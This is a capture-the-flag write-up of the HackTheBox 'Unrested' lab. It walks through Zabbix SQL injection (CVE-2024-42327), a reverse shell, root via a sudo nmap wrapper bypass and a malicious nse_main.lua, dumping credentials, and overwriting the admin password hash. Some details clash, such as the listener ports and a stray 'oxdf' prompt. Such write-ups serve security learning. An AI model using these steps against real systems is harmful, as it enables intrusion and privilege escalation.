# Nmap
```
┌──(wither㉿localhost)-[~/Templates/htb-labs/Unrested]
└─$ nmap -sC -sV -Pn 10.10.11.50 -oN ./nmap.txt 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-24 16:50 UTC
Nmap scan report for 10.10.11.50
Host is up (0.40s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 277.64 seconds

```
And also we have the credit `matthew / 96qzn0h2e1k3`
```
Machine Information

As is common in real life pentests, you will start the Unrested box with credentials for the following account on Zabbix: matthew / 96qzn0h2e1k3
```

# Page check
**index page**
![](images/Pasted%20image%2020250724165812.png)
Then we can use the default credit to login to dashboard

**dashboard page**
![](images/Pasted%20image%2020250724165923.png)
We can get the version of this service `Zabbix frontend version|7.0.0|`
Then we can find the vulnerable exploits from exploit-db
`Zabbix 7.0.0 - SQL Injection`
![](images/Pasted%20image%2020250724170111.png)
Then we can run the vulnerable_check script
```
┌──(wither㉿localhost)-[~/Templates/htb-labs/Unrested]
└─$ python3 exploit.py -u matthew -p 96qzn0h2e1k3 -t http://10.10.11.50/zabbix
[!] VULNERABLE.
```

# CVE-2024-42327
Let's follow the document of `Zabbix` to enumerate the database
`https://www.zabbix.com/documentation/current/en/manual/api`

We can try to force curl requests to go through HTTP proxy to allow Burp Suite to capture packets
I would firstly get the authorized_key to help us pass the auth.
```
curl -x http://127.0.0.1:8080 http://10.10.11.50/zabbix/api_jsonrpc.php \
  -H 'Content-Type: application/json-rpc' \
  -d '{"jsonrpc": "2.0", "method": "user.login", "params": {"username": "matthew", "password": "96qzn0h2e1k3"}, "id": 1}'
```
![](images/Pasted%20image%2020250724172802.png)

Then we can add the authorized_key to Head, then we can check the editable users
![](images/Pasted%20image%2020250724173112.png)
We can make the server cracked
![](images/Pasted%20image%2020250724173416.png)
We successfully get the error code `500 Internal Server Error`

The code generating the query is:
```
$db_roles = DBselect(
    'SELECT u.userid'.($options['selectRole'] ? ',r.'.implode(',r.', $options['selectRole']) : '').
    ' FROM users u,role r'.
    ' WHERE u.roleid=r.roleid'.
    ' AND '.dbConditionInt('u.userid', $userIds)
);
```
It’s taking the `selectRole` option and joining all of them with` ,r.`. So if I passed in `["role1", "role2"]`, it would generate:
```
SELECT u.userid,r.role1,r.role2 FROM users u, role r WHERE u.roleid=role.roleid AND u.userid in [$userIds];
```
 If we want to get data back, I need to include the `FROM users u, role r WHERE u.roleid=r.roleid r;-- -` in our query.

Let's start with a simple query to get the role name
![](images/Pasted%20image%2020250724173840.png)
We should be able to inject to have it show all roles:
![](images/Pasted%20image%2020250724174527.png)
The query would be 
```
SELECT u.userid,r.name from users u, role r WHERE u.roleid=r.roleid; -- - FROM users u, role r WHERE u.roleid=role.roleid AND u.userid in [$userIds];
```

We can also get the version of database `10.11.10-MariaDB-ubu2204`
![](images/Pasted%20image%2020250724174824.png)

Now we have 2 ways:
1, Use `sqlmap` to dump the database
2, try to get a session as the Admin user and run the reverse shell by database

Session ids are held in the sessions table in the `sessiondid` column.
![](images/Pasted%20image%2020250724175209.png)Then let's check that session id
![](images/Pasted%20image%2020250724175323.png)
It did work here.

To execute a command, I need to have a `hostid`. I’ll use the `host.get` API to list the hosts 
![](images/Pasted%20image%2020250724175539.png)
Then run the reverse shell
![](images/Pasted%20image%2020250724175722.png)
We can get the reverse shell back
```
┌──(wither㉿localhost)-[~/Templates/htb-labs/Unrested]
└─$ nc -lnvp 4444    
listening on [any] 4444 ...
connect to [10.10.14.5] from (UNKNOWN) [10.10.11.50] 42944
bash: cannot set terminal process group (1969): Inappropriate ioctl for device
bash: no job control in this shell
zabbix@unrested:/$ id
id
uid=114(zabbix) gid=121(zabbix) groups=121(zabbix)
zabbix@unrested:/$ whoami
whoami
zabbix

```

We can also upgrade the shell
```
zabbix@unrested:/$ script /dev/null -c bash
script /dev/null -c bash
Script started, output log file is '/dev/null'.
zabbix@unrested:/$ ^Z
[1]+  Stopped                 nc -lnvp 443
oxdf@hacky$ stty raw -echo; fg
nc -lnvp 443
            reset
reset: unknown terminal type unknown
Terminal type? screen
zabbix@unrested:/$ 
```

# Shell as root
Firstly I would like check `sudo -l`
```
zabbix@unrested:~$ sudo -l
Matching Defaults entries for zabbix on unrested:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User zabbix may run the following commands on unrested:
    (ALL : ALL) NOPASSWD: /usr/bin/nmap *
```

We can find the exploit trick from `GTOBins`
![](images/Pasted%20image%2020250724180121.png)
Firstly I would check the version of nmap
```
zabbix@unrested:~$ nmap --version
Nmap version 7.80 ( https://nmap.org )
Platform: x86_64-pc-linux-gnu
Compiled with: liblua-5.3.6 openssl-3.0.2 nmap-libssh2-1.8.2 libz-1.2.11 libpcre-8.39 libpcap-1.10.1 nmap-libdnet-1.12 ipv6
Compiled without:
Available nsock engines: epoll poll select

```

We can use case a
```
zabbix@unrested:~$ TF=$(mktemp)
zabbix@unrested:~$ echo 'os.execute("/bin/sh")' > $TF
zabbix@unrested:~$ sudo nmap --script=$TF
Script mode is disabled for security reasons.
zabbix@unrested:~$ id
uid=114(zabbix) gid=121(zabbix) groups=121(zabbix)
zabbix@unrested:~$ whoami
zabbix

```
But we failed here, I found this `nmap` is just a script
```
zabbix@unrested:~$ file /usr/bin/nmap
/usr/bin/nmap: Bourne-Again shell script, ASCII text executable
```
We can check it
```
zabbix@unrested:~$ cat /usr/bin/nmap
#!/bin/bash

#################################
## Restrictive nmap for Zabbix ##
#################################

# List of restricted options and corresponding error messages
declare -A RESTRICTED_OPTIONS=(
    ["--interactive"]="Interactive mode is disabled for security reasons."
    ["--script"]="Script mode is disabled for security reasons."
    ["-oG"]="Scan outputs in Greppable format are disabled for security reasons."
    ["-iL"]="File input mode is disabled for security reasons."
)

# Check if any restricted options are used
for option in "${!RESTRICTED_OPTIONS[@]}"; do
    if [[ "$*" == *"$option"* ]]; then
        echo "${RESTRICTED_OPTIONS[$option]}"
        exit 1
    fi
done

# Execute the original nmap binary with the provided arguments
exec /usr/bin/nmap.original "$@"

```

We can use the `--script` argument, which is not checked by the wrapper script.
```
zabbix@unrested:~$ echo 'os.execute("/bin/bash")' > test.sh
zabbix@unrested:~$ sudo nmap -script=test.sh                
Starting Nmap 7.80 ( https://nmap.org ) at 2025-03-01 01:17 UTC
NSE: Warning: Loading 'test.sh' -- the recommended file extension is '.nse'.
root@unrested:/var/lib/zabbix# reset: unknown terminal type unknown
Terminal type? screen
root@unrested:/var/lib/zabbix# id
uid=0(root) gid=0(root) groups=0(root)
```

We can also abuse the `--datadir` option
The default value is `/usr/share/nmap`:
```
zabbix@unrested:~$ ls -al /usr/share/nmap
total 9192
drwxr-xr-x   4 root root    4096 Dec  1  2024 .
drwxr-xr-x 126 root root    4096 Dec  3  2024 ..
-rw-r--r--   1 root root   10556 Jan 12  2023 nmap.dtd
-rw-r--r--   1 root root  717314 Jan 12  2023 nmap-mac-prefixes
-rw-r--r--   1 root root 5002931 Jan 12  2023 nmap-os-db
-rw-r--r--   1 root root   14579 Jan 12  2023 nmap-payloads
-rw-r--r--   1 root root    6703 Jan 12  2023 nmap-protocols
-rw-r--r--   1 root root   49647 Jan 12  2023 nmap-rpc
-rw-r--r--   1 root root 2461461 Jan 12  2023 nmap-service-probes
-rw-r--r--   1 root root 1000134 Jan 12  2023 nmap-services
-rw-r--r--   1 root root   31936 Jan 12  2023 nmap.xsl
drwxr-xr-x   3 root root    4096 Dec  1  2024 nselib
-rw-r--r--   1 root root   48404 Jan 12  2023 nse_main.lua
drwxr-xr-x   2 root root   36864 Dec  1  2024 scripts

```

Every time `nmap` is run with `-sC` it runs the `nse_main.lua` file. If I create a new directory and tell `nmap` that directory is the data directory it loads it
```
zabbix@unrested:~$ echo 'os.execute("/bin/bash")' > /tmp/nse_main.lua
zabbix@unrested:~$ sudo /usr/bin/nmap --datadir /tmp -sC localhost   
Starting Nmap 7.80 ( https://nmap.org ) at 2025-03-01 01:25 UTC
root@unrested:/var/lib/zabbix# reset: unknown terminal type unknown
Terminal type? screen
root@unrested:/var/lib/zabbix# id
uid=0(root) gid=0(root) groups=0(root)
```

# Beyond the footpath
We can also use `sqlmap` to help us dump all the database
```
sqlmap -r sql.req --level=5 --risk=3 --batch --flush-session --dbms=MySQL  --technique=U 
```
Our `sql.req` would be
```
POST /zabbix/api_jsonrpc.php HTTP/1.1
Host: 10.10.11.50
User-Agent: curl/8.14.1
Accept: */*
Content-Type: application/json-rpc
Content-Length: 317
Connection: close

{
  "jsonrpc": "2.0",
  "id": 1,
"auth": "1a09915e8c868b14ca2f5d44315d56fe",
  "method": "user.get",
  "params": {
    "output": [],
    "selectRole": [
       "*"
    ],
    "editable": 1
  }
}
```
Use `*` as injection point for nested JSON keys.
PS: the authorized_key will be expired by about 10 mins, so the `sqlmap` process would be affected.
# Beyond the root
There is another vulnerable exploit here  `CVE-2024-36467`
![](images/Pasted%20image%2020250724183405.png)
```
An authenticated user with API access (e.g.: user with default User role), more specifically a user with access to the user.update API endpoint is enough to be able to add themselves to any group (e.g.: Zabbix Administrators), except to groups that are disabled or having restricted GUI access.
```
That means we can try to make the default account into the group admin

When I wanna change the default account into `Super Admin (role 3)`, it sends me an error message
![](images/Pasted%20image%2020250724183801.png)
The real highest privilege comes from the super admin role, and regular admins don't have anything very important.
Super admins can make some common `misconfigurations` that give this group a way to do something nefarious from here.

Then let's use root shell to check the database credit
```
root@unrested:/var/lib/zabbix# cat /etc/zabbix/zabbix_server.conf | grep DB
### NOTE: Support for Oracle DB is deprecated since Zabbix 7.0 and will be removed in future versions.
### Option: DBHost
# DBHost=localhost
### Option: DBName
#       the tnsnames.ora file or set to empty string; also see the TWO_TASK environment variable if DBName is set to
# DBName=
DBName=zabbix
### Option: DBSchema
# DBSchema=
### Option: DBUser
# DBUser=
DBUser=zabbix
### Option: DBPassword
DBPassword=ZabberzPassword2024!
```
We can get the `zabbix:ZabberzPassword2024!`

Then we can get the user tables
```
MariaDB [zabbix]> select * from users;
+--------+----------+---------+---------------+--------------------------------------------------------------+-----+-----------+------------+---------+---------+---------+----------------+------------+---------------+---------------+----------+--------+-----------------+----------------+
| userid | username | name    | surname       | passwd                                                       | url | autologin | autologout | lang    | refresh | theme   | attempt_failed | attempt_ip | attempt_clock | rows_per_page | timezone | roleid | userdirectoryid | ts_provisioned |
+--------+----------+---------+---------------+--------------------------------------------------------------+-----+-----------+------------+---------+---------+---------+----------------+------------+---------------+---------------+----------+--------+-----------------+----------------+
|      1 | Admin    | Zabbix  | Administrator | $2y$10$L8UqvYPqu6d7c8NeChnxWe1.w6ycyBERr8UgeUYh.3AO7ps3zer2a |     |         1 | 0          | default | 30s     | default |              0 |            |             0 |            50 | default  |      3 |            NULL |              0 |
|      2 | guest    |         |               | $2y$10$89otZrRNmde97rIyzclecuk6LwKAsHN0BcvoOKGjbT.BwMBfm7G06 |     |         0 | 15m        | default | 30s     | default |              0 |            |             0 |            50 | default  |      4 |            NULL |              0 |
|      3 | matthew  | Matthew | Smith         | $2y$10$e2IsM6YkVvyLX43W5CVhxeA46ChWOUNRzSdIyVzKhRTK00eGq4SwS |     |         1 | 0          | default | 30s     | default |              0 |            |             0 |            50 | default  |      1 |            NULL |              0 |
+--------+----------+---------+---------------+--------------------------------------------------------------+-----+-----------+------------+---------+---------+---------+----------------+------------+---------------+---------------+----------+--------+-----------------+----------------+

```

I’ll set the Admin user to have the same password as `matthew`:
```
MariaDB [zabbix]> update users set passwd = '$2y$10$e2IsM6YkVvyLX43W5CVhxeA46ChW
OUNRzSdIyVzKhRTK00eGq4SwS' where userid = 1;
Query OK, 1 row affected (0.002 sec)
Rows matched: 1  Changed: 1  Warnings: 0
```

Then we can login as `admin` to check the dashboard
![](images/Pasted%20image%2020250724185110.png)
Then we can press `Data collection` to check what we keys we run before

# Description

The main point is to examine our use and enumeration of `Zabbit` interfaces. I think reading documents is the most time-consuming thing. The SQL injection part is not complicated.

For root, it is very interesting to use a shell packaging script here, which just corresponds to the name of the machine reset, which is very interesting.